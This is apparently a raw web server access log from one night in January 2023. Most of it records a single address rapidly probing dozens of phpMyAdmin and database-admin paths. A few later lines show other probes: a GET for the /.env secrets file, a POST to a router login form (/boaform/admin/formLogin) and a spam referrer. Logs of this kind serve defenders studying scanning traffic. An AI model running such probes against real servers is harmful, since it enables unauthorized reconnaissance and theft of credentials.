47.146.40.94 - - [15/Jan/2023:20:53:17 -0600] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:17 -0600] "GET /sql/sql-admin/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:18 -0600] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:18 -0600] "GET /mysql/pMA/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:18 -0600] "GET /phpmyadmin2015/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:18 -0600] "GET /phpmyadmin_/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:18 -0600] "GET /__phpmyadmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:18 -0600] "GET /php-my-admin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:18 -0600] "GET /shopdb/index.php?lang=en HTTP/1.1" 301 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:18 -0600] "GET /sql/webadmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:18 -0600] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 301 299 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:23 -0600] "GET /_phpmyadmin_/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:24 -0600] "GET /phpmyadmin2013/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:24 -0600] "GET /phpmyadmin2020/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:24 -0600] "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:24 -0600] "GET /program/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:24 -0600] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:29 -0600] "GET /sql/sqlweb/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:34 -0600] "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:34 -0600] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:34 -0600] "GET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:34 -0600] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:34 -0600] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:34 -0600] "GET /sql/phpmy-admin/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:39 -0600] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:39 -0600] "GET /phpmyadmin2021/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:39 -0600] "GET /phpMyAdmin5.2/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /db/index.php?lang=en HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /db/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /mysql-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /mysql/admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /phpmyadmin2012/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /_phpmyadmin_/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /sql/webdb/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 301 299 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /dbadmin/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /index.php?lang=en HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /phpMyAdmin1/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /phpmyadmin2018/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /phpMyAdmin3/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /php-my-admin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /phpMyAdmin-latest-all-languages/index.php?lang=en HTTP/1.1" 301 281 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /sql/webadmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:42 -0600] "GET /index.php?lang=en HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:42 -0600] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:45 -0600] "GET /db/dbweb/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:45 -0600] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:45 -0600] "GET /phpmyadmin2020/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:45 -0600] "GET /phpMyAdmin-4.9.10-all-languages/index.php?lang=en HTTP/1.1" 301 281 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:45 -0600] "GET /phpMyAdmin-5.2.0-all-languages/index.php?lang=en HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:45 -0600] "GET /pma/index.php?lang=en HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /administrator/admin/index.php?lang=en HTTP/1.1" 301 269 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /administrator/db/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /db/phpMyAdmin-4/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /index.php?lang=en HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /phpMyAdmin-latest-all-languages/index.php?lang=en HTTP/1.1" 301 281 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /sql/phpmy-admin/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /sql/webdb/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:51 -0600] "GET /mysql/pMA/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:51 -0600] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:51 -0600] "GET /phpmyadmin3/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:51 -0600] "GET /phpMyAdmin-5/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:51 -0600] "GET /phpmy/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:52 -0600] "GET /1phpmyadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:52 -0600] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:52 -0600] "GET /administrator/PMA/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:52 -0600] "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:52 -0600] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:52 -0600] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:52 -0600] "GET /phpmyadmin2011/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:52 -0600] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:52 -0600] "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:52 -0600] "GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:57 -0600] "GET /admin/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:57 -0600] "GET /phpmyadmin2012/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:57 -0600] "GET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:58 -0600] "GET /administrator/web/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:58 -0600] "GET /mysqlmanager/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:58 -0600] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
143.110.222.166 - - [15/Jan/2023:21:02:49 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
146.70.128.237 - - [15/Jan/2023:21:14:27 -0600] "POST /?p=1 HTTP/1.1" 301 236 "http://http://fell.net.top-product.top/" "Mozilla/4.0 +(http://chat-online.top/)"
154.113.120.42 - - [15/Jan/2023:21:36:07 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
179.43.177.242 - - [15/Jan/2023:21:41:14 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
45.79.181.104 - - [15/Jan/2023:21:44:05 -0600] "\x16\x03\x01" 400 226 "-" "-"
109.232.106.7 - - [15/Jan/2023:21:48:45 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
205.185.118.237 - - [15/Jan/2023:21:56:14 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [15/Jan/2023:22:06:05 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
4.17.224.131 - - [15/Jan/2023:22:09:46 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
4.17.224.131 - - [15/Jan/2023:22:09:47 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
194.180.49.233 - - [15/Jan/2023:22:48:36 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
